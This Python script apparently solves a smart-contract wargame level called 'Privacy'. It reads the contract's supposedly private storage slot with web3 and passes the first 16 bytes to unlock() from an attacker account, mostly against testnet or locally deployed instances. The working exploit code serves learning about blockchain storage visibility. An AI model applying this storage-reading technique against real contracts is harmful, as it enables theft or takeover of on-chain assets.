#!/usr/bin/python3
from brownie import Privacy, web3
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address : 0x0b87713d03469E66CBB45FCd5b813bbcE6C7457D,               0x78d7bA78C6F083Ce956B9E03Df1179499956c45f


def unlock(contract_address=None, attacker=None):
    if not contract_address:
        privacy_contract, owner = deploy()
        contract_address = privacy_contract.address
        _, attacker = get_account()
    else:
        privacy_contract = Privacy.at(contract_address)

    print(f"{green}Locked -> {red}{privacy_contract.locked()}{reset}")

    """
    # * to analyse the values stored inside the storage
    storage = []
    for i in range(6):
        data = web3.eth.get_storage_at(contract_address, i)
        storage.append(data.hex())
    print(storage)
    """
    last_data = web3.eth.get_storage_at(contract_address, 5)
    # print(convert.to_int(last_data))
    # print(last_data.hex())

    # bytes16_data = convert.to_bytes(last_data, "bytes16")
    # print(bytes16_data)
    privacy_contract.unlock(last_data[:16], {"from": attacker})

    print(f"{green}Locked -> {red}{privacy_contract.locked()}{reset}")


def main(contract_address=None):
    if contract_address:
        unlock(contract_address, get_account())
    else:
        unlock()


if __name__ == "__main__":
    main()
